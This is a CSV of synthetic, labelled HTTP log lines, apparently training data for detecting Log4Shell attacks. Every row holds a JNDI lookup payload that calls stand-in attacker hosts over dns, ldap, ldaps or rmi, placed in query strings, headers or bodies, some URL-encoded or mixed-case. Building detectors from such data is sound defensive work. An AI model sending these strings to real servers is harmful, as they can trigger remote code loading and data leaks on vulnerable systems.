id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-000037,2026-05-17,synthetic,GET /?q=${jndi:dns://evil.example/d} HTTP/1.1,get /?q=${jndi:dns://evil.example/d} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000038,2026-05-17,synthetic,GET /api/check?debug=${jndi:dns://evil.example/d} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://evil.example/d} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000039,2026-05-17,synthetic,Request from User-Agent: ${jndi:dns://evil.example/d} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:dns://evil.example/d} | method: get | host: app.local | path: /,1,log4shell,plain,user_agent,train,critical
LS-000040,2026-05-17,synthetic,Request from User-Agent: ${jndi:dns://evil.example/d},request from user-agent: ${jndi:dns://evil.example/d},1,log4shell,plain,user_agent_minimal,train,critical
LS-000041,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jndi:dns://evil.example/d},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:dns://evil.example/d},1,log4shell,plain,x_api_version,train,critical
LS-000042,2026-05-17,synthetic,GET /search?q=${jndi:dns://evil.example/d} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${jndi:dns://evil.example/d} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,plain,path,train,critical
LS-000043,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:dns://evil.example/d},post /search http/1.1 host: app.local body: query=${jndi:dns://evil.example/d},1,log4shell,plain,body,train,critical
LS-000044,2026-05-17,synthetic,GET /?q=${jndi:dns://evil.example/d} HTTP/1.1,get /?q=${jndi:dns://evil.example/d} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000045,2026-05-17,synthetic,GET /api/check?debug=${jndi:dns://evil.example/d} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://evil.example/d} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000046,2026-05-17,synthetic,Request from User-Agent: ${jndi:dns://evil.example/d} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:dns://evil.example/d} | method: get | host: app.local | path: /metrics,1,log4shell,plain,user_agent,train,critical
LS-000047,2026-05-17,synthetic,Request from User-Agent: ${jndi:dns://evil.example/d},request from user-agent: ${jndi:dns://evil.example/d},1,log4shell,plain,user_agent_minimal,train,critical
LS-000048,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${jndi:dns://evil.example/d},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:dns://evil.example/d},1,log4shell,plain,x_api_version,train,critical
LS-000049,2026-05-17,synthetic,GET /?q=${jndi:ldaps://evil.example/e} HTTP/1.1,get /?q=${jndi:ldaps://evil.example/e} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000050,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldaps://evil.example/e} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldaps://evil.example/e} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000051,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldaps://evil.example/e} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldaps://evil.example/e} | method: get | host: app.local | path: /static/app.js,1,log4shell,plain,user_agent,train,critical
LS-000052,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldaps://evil.example/e},request from user-agent: ${jndi:ldaps://evil.example/e},1,log4shell,plain,user_agent_minimal,train,critical
LS-000053,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${jndi:ldaps://evil.example/e},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldaps://evil.example/e},1,log4shell,plain,x_api_version,train,critical
LS-000054,2026-05-17,synthetic,GET /search?q=${jndi:ldaps://evil.example/e} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldaps://evil.example/e} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,plain,path,train,critical
LS-000055,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldaps://evil.example/e},post /search http/1.1 host: app.local body: query=${jndi:ldaps://evil.example/e},1,log4shell,plain,body,train,critical
LS-000056,2026-05-17,synthetic,GET /?q=${jndi:ldaps://evil.example/e} HTTP/1.1,get /?q=${jndi:ldaps://evil.example/e} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000057,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldaps://evil.example/e} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldaps://evil.example/e} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000058,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldaps://evil.example/e} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldaps://evil.example/e} | method: get | host: app.local | path: /search?q=boots,1,log4shell,plain,user_agent,train,critical
LS-000059,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldaps://evil.example/e},request from user-agent: ${jndi:ldaps://evil.example/e},1,log4shell,plain,user_agent_minimal,train,critical
LS-000060,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jndi:ldaps://evil.example/e},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldaps://evil.example/e},1,log4shell,plain,x_api_version,train,critical
LS-000061,2026-05-17,synthetic,GET /?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D HTTP/1.1,get /?q=${jndi:ldap://evil.example/enc} http/1.1,1,log4shell,url_encoded,minimal_query,train,critical
LS-000062,2026-05-17,synthetic,GET /api/check?debug=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/enc} http/1.1 host: app.local,1,log4shell,url_encoded,uri_param,train,critical
LS-000063,2026-05-17,synthetic,Request from User-Agent: %24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://evil.example/enc} | method: get | host: app.local | path: /,1,log4shell,url_encoded,user_agent,train,critical
LS-000064,2026-05-17,synthetic,Request from User-Agent: %24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D,request from user-agent: ${jndi:ldap://evil.example/enc},1,log4shell,url_encoded,user_agent_minimal,train,critical
LS-000065,2026-05-17,synthetic,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: %24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D,request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://evil.example/enc},1,log4shell,url_encoded,x_api_version,train,critical
LS-000066,2026-05-17,synthetic,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${jndi:ldap://evil.example/enc} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,url_encoded,path,train,critical
LS-000067,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D,post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/enc},1,log4shell,url_encoded,body,train,critical
LS-000068,2026-05-17,synthetic,GET /?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D HTTP/1.1,get /?q=${jndi:ldap://evil.example/enc} http/1.1,1,log4shell,url_encoded,minimal_query,train,critical
LS-000069,2026-05-17,synthetic,GET /api/check?debug=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/enc} http/1.1 host: app.local,1,log4shell,url_encoded,uri_param,train,critical
LS-000070,2026-05-17,synthetic,Request from User-Agent: %24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://evil.example/enc} | method: get | host: app.local | path: /static/app.js,1,log4shell,url_encoded,user_agent,train,critical
LS-000071,2026-05-17,synthetic,Request from User-Agent: %24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D,request from user-agent: ${jndi:ldap://evil.example/enc},1,log4shell,url_encoded,user_agent_minimal,train,critical
LS-000072,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: %24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fenc%7D,request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://evil.example/enc},1,log4shell,url_encoded,x_api_version,train,critical
LS-000073,2026-05-17,synthetic,GET /?q=${JnDi:LdAp://evil.example/mixed} HTTP/1.1,get /?q=${jndi:ldap://evil.example/mixed} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000074,2026-05-17,synthetic,GET /api/check?debug=${JnDi:LdAp://evil.example/mixed} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/mixed} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000075,2026-05-17,synthetic,Request from User-Agent: ${JnDi:LdAp://evil.example/mixed} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://evil.example/mixed} | method: get | host: app.local | path: /static/app.js,1,log4shell,plain,user_agent,train,critical
LS-000076,2026-05-17,synthetic,Request from User-Agent: ${JnDi:LdAp://evil.example/mixed},request from user-agent: ${jndi:ldap://evil.example/mixed},1,log4shell,plain,user_agent_minimal,train,critical
LS-000077,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${JnDi:LdAp://evil.example/mixed},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://evil.example/mixed},1,log4shell,plain,x_api_version,train,critical
LS-000078,2026-05-17,synthetic,GET /search?q=${JnDi:LdAp://evil.example/mixed} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://evil.example/mixed} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,plain,path,train,critical
LS-000079,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${JnDi:LdAp://evil.example/mixed},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/mixed},1,log4shell,plain,body,train,critical
LS-000080,2026-05-17,synthetic,GET /?q=${JnDi:LdAp://evil.example/mixed} HTTP/1.1,get /?q=${jndi:ldap://evil.example/mixed} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000081,2026-05-17,synthetic,GET /api/check?debug=${JnDi:LdAp://evil.example/mixed} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/mixed} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000082,2026-05-17,synthetic,Request from User-Agent: ${JnDi:LdAp://evil.example/mixed} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://evil.example/mixed} | method: get | host: app.local | path: /,1,log4shell,plain,user_agent,train,critical
LS-000083,2026-05-17,synthetic,Request from User-Agent: ${JnDi:LdAp://evil.example/mixed},request from user-agent: ${jndi:ldap://evil.example/mixed},1,log4shell,plain,user_agent_minimal,train,critical
LS-000084,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${JnDi:LdAp://evil.example/mixed},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://evil.example/mixed},1,log4shell,plain,x_api_version,train,critical
LS-000205,2026-05-17,synthetic,GET /?q=${jndi:ldap://attacker.evil.com/a} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/a} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000206,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://attacker.evil.com/a} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/a} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000207,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/a} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://attacker.evil.com/a} | method: get | host: app.local | path: /home,1,log4shell,plain,user_agent,train,critical
LS-000208,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/a},request from user-agent: ${jndi:ldap://attacker.evil.com/a},1,log4shell,plain,user_agent_minimal,train,critical
LS-000209,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${jndi:ldap://attacker.evil.com/a},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://attacker.evil.com/a},1,log4shell,plain,x_api_version,train,critical
LS-000210,2026-05-17,synthetic,GET /search?q=${jndi:ldap://attacker.evil.com/a} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jndi:ldap://attacker.evil.com/a} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,plain,path,train,critical
LS-000211,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldap://attacker.evil.com/a},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/a},1,log4shell,plain,body,train,critical
LS-000212,2026-05-17,synthetic,GET /?q=${jndi:ldap://attacker.evil.com/a} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/a} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000213,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://attacker.evil.com/a} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/a} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000214,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/a} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://attacker.evil.com/a} | method: get | host: app.local | path: /search?q=boots,1,log4shell,plain,user_agent,train,critical
LS-000215,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/a},request from user-agent: ${jndi:ldap://attacker.evil.com/a},1,log4shell,plain,user_agent_minimal,train,critical
LS-000216,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jndi:ldap://attacker.evil.com/a},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://attacker.evil.com/a},1,log4shell,plain,x_api_version,train,critical
LS-000217,2026-05-17,synthetic,GET /?q=${jndi:ldap://attacker.evil.com/b} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/b} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000218,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://attacker.evil.com/b} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/b} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000219,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/b} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://attacker.evil.com/b} | method: get | host: app.local | path: /home,1,log4shell,plain,user_agent,train,critical
LS-000220,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/b},request from user-agent: ${jndi:ldap://attacker.evil.com/b},1,log4shell,plain,user_agent_minimal,train,critical
LS-000221,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${jndi:ldap://attacker.evil.com/b},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://attacker.evil.com/b},1,log4shell,plain,x_api_version,train,critical
LS-000222,2026-05-17,synthetic,GET /search?q=${jndi:ldap://attacker.evil.com/b} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://attacker.evil.com/b} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,plain,path,train,critical
LS-000223,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${jndi:ldap://attacker.evil.com/b},post /search http/1.1 host: app.local body: query=${jndi:ldap://attacker.evil.com/b},1,log4shell,plain,body,train,critical
LS-000224,2026-05-17,synthetic,GET /?q=${jndi:ldap://attacker.evil.com/b} HTTP/1.1,get /?q=${jndi:ldap://attacker.evil.com/b} http/1.1,1,log4shell,plain,minimal_query,train,critical
LS-000225,2026-05-17,synthetic,GET /api/check?debug=${jndi:ldap://attacker.evil.com/b} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://attacker.evil.com/b} http/1.1 host: app.local,1,log4shell,plain,uri_param,train,critical
LS-000226,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/b} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://attacker.evil.com/b} | method: get | host: app.local | path: /search?q=boots,1,log4shell,plain,user_agent,train,critical
LS-000227,2026-05-17,synthetic,Request from User-Agent: ${jndi:ldap://attacker.evil.com/b},request from user-agent: ${jndi:ldap://attacker.evil.com/b},1,log4shell,plain,user_agent_minimal,train,critical
LS-000228,2026-05-17,synthetic,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${jndi:ldap://attacker.evil.com/b},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://attacker.evil.com/b},1,log4shell,plain,x_api_version,train,critical
LS-000229,2026-05-17,synthetic,GET /?q=${jndi:rmi://attacker.evil.com/c} HTTP/1.1,get /?q=${jndi:rmi://attacker.evil.com/c} http/1.1,1,log4shell,plain,minimal_query,train,critical
